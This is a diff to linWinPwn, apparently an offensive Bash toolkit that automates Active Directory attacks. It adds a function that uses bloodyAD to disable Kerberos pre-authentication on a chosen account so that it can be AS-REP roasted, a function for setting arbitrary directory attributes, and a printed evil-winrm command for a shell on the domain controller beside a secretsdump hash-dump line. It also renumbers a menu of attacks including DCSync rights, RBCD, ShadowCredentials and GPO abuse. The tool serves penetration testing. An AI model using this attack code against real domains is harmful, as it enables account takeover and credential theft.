@@ -178,7 +178,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.4.10 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.4.11 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -2229,6 +2229,8 @@ certipy_enum() {
             read -rp ">> " cert_ans </dev/tty
             if [[ ! "${cert_ans}" == "y" ]] && [[ ! "${cert_ans}" == "Y" ]]; then
                 return 1
+            else
+                /bin/mv "${ADCS_dir}/vuln_${dc_domain}_Certipy.json" "${ADCS_dir}/vuln_${dc_domain}_Certipy.json.bak" 2>/dev/null
             fi
         fi
         if [ "${nullsess_bool}" == true ]; then
@@ -2386,6 +2388,7 @@ adcs_vuln_parse() {
             echo -e "${CYAN}3. Use the obtained TGT to perform privileged actions:${NC}"
             echo -e "export KRB5CCNAME=${user}.ccache"
             echo -e "secretsdump.py -just-dc-user '${dc_NETBIOS}$' ${argument_imp} -dc-ip ${dc_ip} -k -no-pass"
+            echo -e "evil-winrm -i '${dc_NETBIOS}$' -r '${dc_domain}$' -k -c ${user}.ccache"
         done
     fi
 
@@ -4072,6 +4075,30 @@ disable_account() {
     echo -e ""
 }
 
+enable_asrep() {
+    if ! stat "${bloodyad}" >/dev/null 2>&1; then
+        echo -e "${RED}[-] Please verify the installation of bloodyad${NC}"
+    else
+        mkdir -p "${Modification_dir}/bloodyAD_${user_var}"
+        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
+            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
+            echo -e "${BLUE}[*] Please specify account to enable AS-REP roasting on:${NC}"
+            echo -e "${CYAN}[*] Example: svc_sql ${NC}"
+            target_asrep=""
+            read -rp ">> " target_asrep </dev/tty
+            while [ "${target_asrep}" == "" ]; do
+                echo -e "${RED}Invalid name.${NC} Please specify target account:"
+                read -rp ">> " target_asrep </dev/tty
+            done
+            echo -e "${BLUE}[*] Enabling AS-REP roasting on ${target_asrep}${NC}"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add uac '${target_asrep}' -f DONT_REQ_PREAUTH" | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_asrep_enable_${dc_domain}.txt"
+        fi
+    fi
+    echo -e ""
+}
+
 restore_account() {
     if ! stat "${bloodyad}" >/dev/null 2>&1; then
         echo -e "${RED}[-] Please verify the installation of bloodyad${NC}"
@@ -4708,6 +4735,47 @@ badsuccessor_deletedmsa() {
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-method LDAPS"; else ldaps_param="-method LDAP"; fi
             echo -e "${CYAN}[*] Removing dMSA named ${dmsa_name} from ${target_ou}${NC}"
             run_command "${impacket_badsuccessor} ${argument_imp} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} ${ldaps_param} -action delete -dmsa-name '${dmsa_name}' -target-ou '${target_ou}'" 2>&1 | tee -a "${Modification_dir}/badsuccessor_deletedmsa_${user_var}.txt"
+        fi
+    fi
+    echo -e ""
+}
+
+modify_custom_attribute() {
+        if ! stat "${bloodyad}" >/dev/null 2>&1; then
+        echo -e "${RED}[-] Please verify the installation of bloodyad${NC}"
+    else
+        mkdir -p "${Modification_dir}/bloodyAD_${user_var}"
+        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
+            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
+            echo -e "${BLUE}[*] Modifying custom attribute. Please specify target:${NC}"
+            echo -e "${CYAN}[*] Example: user01 or DC01$ ${NC}"
+            target_custommodif=""
+            read -rp ">> " target_custommodif </dev/tty
+            while [ "${target_custommodif}" == "" ]; do
+                echo -e "${RED}Invalid name.${NC} Please specify target:"
+                read -rp ">> " target_custommodif </dev/tty
+            done
+            echo -e "${BLUE}[*] Please specify attribute to modify:${NC}"
+            echo -e "${CYAN}[*] Example: logonHours ${NC}"
+            attr_custommodif=""
+            read -rp ">> " attr_custommodif </dev/tty
+            while [ "${attr_custommodif}" == "" ]; do
+                echo -e "${RED}Invalid attribute.${NC} Please specify attribute:"
+                read -rp ">> " attr_custommodif </dev/tty
+            done
+            echo -e "${BLUE}[*] Please specify value to set for ${attr_custommodif} (default: empty):${NC}"
+            echo -e "${CYAN}[*] Example: user02@domain  or HOST/DC01.domain ${NC}"
+            value_custommodif=""
+            read -rp ">> " value_custommodif </dev/tty
+            if [ "${value_custommodif}" == "" ]; then
+                value_custommodif=""
+            else
+                value_custommodif="-v '${value_custommodif}'"
+            fi
+            echo -e "${CYAN}[*] Modifying custom attribute of ${target_custommodif}${NC}"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set object '${target_custommodif}' '${attr_custommodif}' ${value_custommodif} " 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_consdeleg_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -7262,20 +7330,23 @@ modif_menu() {
     check_tool_status "${bloodyad}" "Delete user or computer (Requires: GenericWrite)" "11"
     check_tool_status "${bloodyad}" "Restore deleted user or computer (Requires: GenericWrite on OU of deleted object)" "12"
     check_tool_status "${targetedKerberoast}" "Targeted Kerberoast Attack (Noisy!) (Requires: WriteSPN)" "13"
-    check_tool_status "${bloodyad}" "Perform RBCD attack (Requires: AllowedToAct on computer)" "14"
-    check_tool_status "${bloodyad}" "Perform RBCD attack on SPN-less user (Requires: AllowedToAct on computer & MAQ=0)" "15"
-    check_tool_status "${bloodyad}" "Perform ShadowCredentials attack (Requires: AddKeyCredentialLink)" "16"
-    check_tool_status "${bloodyad}" "Remove added ShadowCredentials (Requires: AddKeyCredentialLink)" "17"
-    check_tool_status "${pygpoabuse}" "Abuse GPO to execute command (Requires: GenericWrite on GPO)" "18"
-    check_tool_status "${bloodyad}" "Add Unconstrained Delegation rights - uac: TRUSTED_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege)" "19"
-    check_tool_status "${bloodyad}" "Add DCSync rights (Requires: GenericWrite)" "20"
-    check_tool_status "${bloodyad}" "Add CIFS and HTTP SPNs entries to computer with Unconstrained Deleg rights - ServicePrincipalName & msDS-AdditionalDnsHostName (Requires: Owner of computer)" "21"
-    check_tool_status "${bloodyad}" "Add userPrincipalName to perform Kerberos impersonation of another user (Targeting Linux machines) (Requires: GenericWrite on user)" "22"
-    check_tool_status "${bloodyad}" "Modify userPrincipalName to perform Certificate impersonation (ESC10) (Requires: GenericWrite on user)" "23"
-    check_tool_status "${bloodyad}" "Add Constrained Delegation rights - uac: TRUSTED_TO_AUTH_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege)" "24"
-    check_tool_status "${bloodyad}" "Add HOST and LDAP SPN entries of DC to computer with Constrained Deleg rights - msDS-AllowedToDelegateTo (Requires: Owner of computer)" "25"
-    check_tool_status "${bloodyad}" "Add dMSA to exploit BadSuccessor on Windows Server 2025 (Requires: GenericWrite on OU)" "26"
-    check_tool_status "${bloodyad}" "Remove dMSA to clean after exploiting BadSuccessor (Requires: GenericWrite on OU)" "27"
+    check_tool_status "${bloodyad}" "Enable AS-REP roasting - uac: DONT_REQ_PREAUTH (Requires: GenericWrite on userAccountControl)" "14"
+    check_tool_status "${bloodyad}" "Perform RBCD attack (Requires: AllowedToAct on computer)" "15"
+    check_tool_status "${bloodyad}" "Perform RBCD attack on SPN-less user (Requires: AllowedToAct on computer & MAQ=0)" "16"
+    check_tool_status "${bloodyad}" "Perform ShadowCredentials attack (Requires: AddKeyCredentialLink)" "17"
+    check_tool_status "${bloodyad}" "Remove added ShadowCredentials (Requires: AddKeyCredentialLink)" "18"
+    check_tool_status "${pygpoabuse}" "Abuse GPO to execute command (Requires: GenericWrite on GPO)" "19"
+    check_tool_status "${bloodyad}" "Add Unconstrained Delegation rights - uac: TRUSTED_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege)" "20"
+    check_tool_status "${bloodyad}" "Add DCSync rights (Requires: GenericWrite)" "21"
+    check_tool_status "${bloodyad}" "Add CIFS and HTTP SPNs entries to computer with Unconstrained Deleg rights - ServicePrincipalName & msDS-AdditionalDnsHostName (Requires: Owner of computer)" "22"
+    check_tool_status "${bloodyad}" "Add userPrincipalName to perform Kerberos impersonation of another user (Targeting Linux machines) (Requires: GenericWrite on user)" "23"
+    check_tool_status "${bloodyad}" "Modify userPrincipalName to perform Certificate impersonation (ESC10) (Requires: GenericWrite on user)" "24"
+    check_tool_status "${bloodyad}" "Add Constrained Delegation rights - uac: TRUSTED_TO_AUTH_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege)" "25"
+    check_tool_status "${bloodyad}" "Add HOST and LDAP SPN entries of DC to computer with Constrained Deleg rights - msDS-AllowedToDelegateTo (Requires: Owner of computer)" "26"
+    check_tool_status "${bloodyad}" "Add dMSA to exploit BadSuccessor on Windows Server 2025 (Requires: GenericWrite on OU)" "27"
+    check_tool_status "${bloodyad}" "Remove dMSA to clean after exploiting BadSuccessor (Requires: GenericWrite on OU)" "28"
+    check_tool_status "${bloodyad}" "Modify custom attribute using bloodyad (Requires: GenericWrite)" "29"
+
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -7353,72 +7424,82 @@ modif_menu() {
         ;;
 
     14)
-        rbcd_attack
+        enable_asrep
         modif_menu
         ;;
 
     15)
-        rbcd_spnless_attack
+        rbcd_attack
         modif_menu
         ;;
 
     16)
-        shadowcreds_attack
+        rbcd_spnless_attack
         modif_menu
         ;;
 
     17)
-        shadowcreds_delete
+        shadowcreds_attack
         modif_menu
         ;;
 
     18)
-        pygpo_abuse
+        shadowcreds_delete
         modif_menu
         ;;
 
     19)
-        add_unconstrained
+        pygpo_abuse
         modif_menu
         ;;
 
     20)
-        add_dcsync
+        add_unconstrained
         modif_menu
         ;;
 
     21)
-        add_spn
+        add_dcsync
         modif_menu
         ;;
 
     22)
-        add_upn
+        add_spn
         modif_menu
         ;;
 
     23)
-        add_upn_esc10
+        add_upn
         modif_menu
         ;;
 
     24)
-        add_constrained
+        add_upn_esc10
         modif_menu
         ;;
 
     25)
-        add_spn_constrained
+        add_constrained
         modif_menu
         ;;
 
     26)
-        badsuccessor_adddmsa
+        add_spn_constrained
         modif_menu
         ;;
 
     27)
+        badsuccessor_adddmsa
+        modif_menu
+        ;;
+
+    28)
         badsuccessor_deletedmsa
+        modif_menu
+        ;;
+
+    29)
+        modify_custom_attribute
         modif_menu
         ;;
 
